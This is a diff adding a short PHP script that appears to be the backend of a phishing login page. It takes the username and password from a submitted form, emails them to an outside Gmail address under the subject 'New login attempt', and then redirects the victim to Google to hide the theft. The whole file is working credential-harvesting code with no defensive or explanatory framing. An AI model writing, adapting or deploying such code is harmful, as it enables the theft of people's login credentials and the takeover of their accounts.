@@ -1,0 +1,20 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $to = "doritoskfc@gmail.com";
+    $subject = "New login attempt";
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    $message = "Username: $username\nPassword: $password";
+    $headers = "From: no-reply@yourdomain.com";
+
+    // Send email
+    mail($to, $subject, $message, $headers);
+
+    // Redirect to Google
+    header("Location: https://www.google.com");
+    exit();
+} else {
+    header("Location: index.html");
+    exit();
+}
+?>
